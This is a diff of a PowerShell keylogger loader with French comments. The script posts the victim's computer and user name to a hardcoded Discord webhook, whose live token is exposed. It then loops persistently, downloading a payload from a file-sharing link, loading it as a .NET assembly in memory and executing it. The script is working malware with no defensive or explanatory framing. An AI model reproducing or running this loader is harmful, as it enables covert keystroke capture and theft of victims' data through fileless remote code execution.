@@ -1,22 +1,14 @@
 $webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
 
-# Ping toutes les 3 sec
+# Message de démarrage
+iwr $webhook -Method Post -Body (@{content="Keylogger lancé sur $env:COMPUTERNAME – $env:USERNAME"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+
+# Lancement en mémoire + boucle anti-kill (le truc qui marche en 2025)
 while ($true) {
     try {
-        iwr $webhook -Method Post -Body (@{content="PING – $env:COMPUTERNAME – $(Get-Date -Format 'HH:mm:ss')"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+        $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
+        $asm = [Reflection.Assembly]::Load($bytes)
+        $asm.EntryPoint.Invoke($null,$null)
     } catch {}
-    Start-Sleep -Seconds 3
-
-    # Lance ton keylogger en mémoire (une seule fois)
-    if (-not $global:ran) {
-        try {
-            $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
-            $asm = [Reflection.Assembly]::Load($bytes)
-            $asm.EntryPoint.Invoke($null,$null)
-            $global:ran = $true
-            iwr $webhook -Method Post -Body (@{content="KEYLOGGER LANCÉ EN RAM – logs en cours"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
-        } catch {
-            iwr $webhook -Method Post -Body (@{content="ERREUR lancement keylogger : $($_.Exception.Message)"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
-        }
-    }
+    Start-Sleep -Seconds 10
 }
